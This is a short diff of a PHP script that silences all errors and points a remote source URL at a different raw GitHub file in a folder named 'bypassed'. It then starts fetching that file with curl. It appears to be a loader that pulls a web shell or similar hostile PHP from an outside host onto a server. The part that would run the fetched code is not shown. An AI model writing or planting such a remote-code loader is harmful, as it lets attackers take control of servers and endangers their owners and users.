@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/anonsec.php";
+$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/anonsec1.php";
 
 function fetchContent($url) {
     $ch = curl_init();
